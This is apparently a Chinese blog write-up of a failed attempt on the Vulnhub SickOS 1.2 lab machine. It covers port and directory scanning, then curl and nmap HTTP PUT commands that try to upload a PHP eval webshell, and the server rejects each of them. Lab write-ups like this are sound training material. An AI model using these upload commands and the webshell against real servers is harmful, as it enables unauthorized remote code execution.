---
title: Vulnhub-SICKOS:1.2(失败)
date: 2024-02-14  
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Sickos1.2.html"
---

# SICKOS: 1.2（失败）

![image-20240205113022726](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402071320647.png)

## 选择打开环境（VMware）

可以使用`VMware`打开，`VirtualBox`打开会出现问题，按照修改，将`.ovf`文件中所有的`ElementName`改为`Caption`，所有的`vmware.sata.ahci`改为`AHCI`，删除`.mf`文件，重新导入！

我们明知山有虎偏向虎山行，使用`VirtualBox`打开：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402071320649.png" alt="image-20240205114013097" style="zoom:50%;" />

似乎看起来十分的正常，实际我们扫一下会发现：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402071320651.png" alt="image-20240205114457184" style="zoom:50%;" />

扫不出来，切换至`NAT`连接试试：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402071320652.png" alt="image-20240205114717392" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402071320653.png" alt="image-20240205114922061" style="zoom:50%;" />

还是扫不到，不浪费时间在这方面了，使用`vmdk`文件吧：（老样子创建新虚拟机，导入原有硬盘即可）

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402071320654.png" alt="image-20240205115432424" style="zoom:50%;" />

可以看到扫出来了，打开看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402071320655.png" alt="image-20240205115540584" style="zoom:50%;" />

一切正常，下面可以开始进行公鸡辣！

> "Antivirus software company" 指的是提供防病毒软件的公司，这些公司专注于开发和提供用于检测、防止和清除计算机病毒的软件。这类软件通常被设计用于保护计算机系统、网络和数据免受恶意软件、病毒和其他安全威胁的侵害。

## 信息搜集

### 端口扫描

```shell
rustscan -a 192.168.244.183
# PORT   STATE SERVICE REASON
# 22/tcp open  ssh     syn-ack ttl 64
# 80/tcp open  http    syn-ack ttl 64
```

```shell
nmap -sV -p- -A  192.168.244.183 
# PORT   STATE SERVICE VERSION
# 22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
# | ssh-hostkey: 
# |   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
# |   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
# |_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
# 80/tcp open  http    lighttpd 1.4.28
# |_http-server-header: lighttpd/1.4.28
# |_http-title: Site doesn't have a title (text/html).
# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 信息查询

扫描太慢啦，打开源代码看看，啥都没有。

`Wapplalyzer`插件查看信息：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402071320656.png" alt="image-20240205120139742" style="zoom:50%;" />

### 目录扫描

```shell
feroxbuster -u http://192.168.244.183
# 301      GET        0l        0w        0c http://192.168.244.183/test => http://192.168.244.183/test/
# 200      GET      123l      992w    84849c http://192.168.244.183/blow.jpg
# 200      GET       96l       10w      163c http://192.168.244.183/
# 403      GET       11l       26w      345c http://192.168.244.183/~
# 403      GET       11l       26w      345c http://192.168.244.183/~sys~
```

```shell
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.244.183 -f -t 200
# /test/                (Status: 200) [Size: 1360]
```

都显示`test`存在，尝试打开看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402071320657.png" alt="image-20240205121041933" style="zoom:50%;" />

有一个目录，看一下结构，点一下`Parent Directory`，又弹回去了。。。

### 网站指纹识别

```shell
whatweb 192.168.244.183
# http://192.168.244.183 [200 OK] Country[RESERVED][ZZ], HTTPServer[lighttpd/1.4.28], IP[192.168.244.183], PHP[5.3.10-1ubuntu3.21], X-Powered-By[PHP/5.3.10-1ubuntu3.21], lighttpd[1.4.28]
```

### enum4linux

```shell
enum4linux 192.168.244.183
```

只查到了一些用户：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402071320658.png" alt="image-20240205215358703" style="zoom: 67%;" />

### nikto扫描

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.244.183
+ Target Hostname:    192.168.244.183
+ Target Port:        80
+ Start Time:         2024-02-06 22:56:56 (GMT-5)
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.28
+ /: Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .
+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /test/: Directory indexing found.
+ /test/: This might be interesting.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8102 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2024-02-06 22:57:07 (GMT-5) (11 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```



## 漏洞利用

### 尝试lighttpd服务漏洞（失败）

查看一下这个`lighttpd 1.4.28`是否存在漏洞！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402071320659.png" alt="image-20240205121344632" style="zoom:33%;" />

似乎没有我们可以利用来获取flag的漏洞。。。

### put上传漏洞

使用命令查看一下参数信息：

```shell
curl -v -X OPTIONS http://192.168.244.183/test/
# -v: 基本的详细模式，显示请求的相关信息，如请求头和响应头。
# -vv: 更详细的模式，显示详细的请求和响应信息，包括每一步的细节。
# -vvv: 最详细的模式，显示每一个数据包的详细信息，包括 TCP 连接的建立、SSL/TLS 握手等。
# -X OPTIONS: 使用 OPTIONS 方法。OPTIONS 方法通常用于请求目标资源的通信选项，或者查询服务器支持的方法。在这个例子中，它表示发送一个 OPTIONS 请求。
# http://192.168.244.183/test/: 请求的目标 URL，其中 http:// 是协议，192.168.244.183 是主机地址，/test/ 是请求的路径。
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402071320660.png" alt="image-20240205220429070" style="zoom:50%;" />

发现允许多项传输参数，这里发现了`put`，尝试上传自己的恶意文件！可以参考：https://zhuanlan.zhihu.com/p/41454441

然后进行上传 shell 脚本：

#### 一句话木马+蚁剑

上传一下：

```shell
curl -v -X PUT -d '<?php @eval($_GET["hack"]);?>' http://192.168.244.183/test/webshell.php
```

但是我这里总是出现报错，不知道为啥：

```text
*   Trying 192.168.244.183:80...
* Connected to 192.168.244.183 (192.168.244.183) port 80
> PUT /test/webshell.php HTTP/1.1
> Host: 192.168.244.183
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Length: 29
> Content-Type: application/x-www-form-urlencoded
> 
< HTTP/1.1 403 Forbidden
< Content-Type: text/html
< Content-Length: 345
< Date: Tue, 06 Feb 2024 15:27:37 GMT
< Server: lighttpd/1.4.28
< 
<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>403 - Forbidden</title>
 </head>
 <body>
  <h1>403 - Forbidden</h1>
 </body>
</html>
* Connection #0 to host 192.168.244.183 left intact
```

这里觉得可能是因为`curl`默认`HTTP1.1`：

```shell
curl -v -X PUT -d '<?php @eval($_GET["hack"]);?>' http://192.168.244.183/test/webshell.php -0
```

还是不行：

```shell
*   Trying 192.168.244.183:80...
* Connected to 192.168.244.183 (192.168.244.183) port 80
> PUT /test/webshell.php HTTP/1.0
> Host: 192.168.244.183
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Length: 29
> Content-Type: application/x-www-form-urlencoded
> 
* HTTP 1.0, assume close after body
< HTTP/1.0 403 Forbidden
< Content-Type: text/html
< Content-Length: 345
< Connection: close
< Date: Tue, 06 Feb 2024 16:52:35 GMT
< Server: lighttpd/1.4.28
< 
<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>403 - Forbidden</title>
 </head>
 <body>
  <h1>403 - Forbidden</h1>
 </body>
</html>
* Closing connection
```

不知道为啥，直接抓包进行尝试把：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402071320661.png" alt="image-20240207114331521" style="zoom:50%;" />

6，真不知道错在哪里了。。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402071320662.png" alt="image-20240207114954782" style="zoom:50%;" />

### 尝试其他漏洞吧

未发现可以利用的漏洞。。。。

## 额外收获

师傅们使用`nmap`进行了扫描，得知了put方法：

```shell
nmap --script http-methods --script-args http-methods.url-path='/test' 192.168.244.183
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402071320663.png" alt="image-20240205224037334" style="zoom:50%;" />

传入文件的时候可以采用：

```shell
nmap 192.168.244.183 -p 80 --script http-put --script-args http-put.url='/test/nmap_webshell.php',http-put.file='/home/kali/temp/webshell.php'
```

但是我这里失败了，不知道为啥：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402071320664.png" alt="image-20240205232539742" style="zoom:50%;" />

